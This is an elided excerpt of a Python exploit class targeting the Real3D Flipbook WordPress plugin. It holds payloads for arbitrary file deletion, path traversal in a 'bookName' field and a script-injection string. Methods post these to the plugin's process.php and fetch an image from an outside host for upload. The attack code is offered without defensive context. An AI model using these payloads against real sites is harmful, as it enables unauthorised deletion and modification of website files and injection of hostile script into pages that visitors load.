...
class wpFlipbook:
    ...
    payload1 = {'deleteBook' : ''}
    payload2 = {'imgbase' : '', 'bookName' : '../../../', 'pageName' : 'hexo'}
    payload3 = {'action' : 'delete', 'bookId' : '<script>alert(/hexo/)</script>'}
    imageUrl = 'http://johninvest.se/hexo.jpg'
    ...
    def deleteFiles(self):
        ...
        r = self.http(self.url + '/wp-content/plugins/real3d-flipbook/includes/process.php', {'imgbase' : 'hexo'}, True)
    ...
    def uploadImage(self):
        ...
        r = self.http('http://johninvest.se/hexo.jpg')
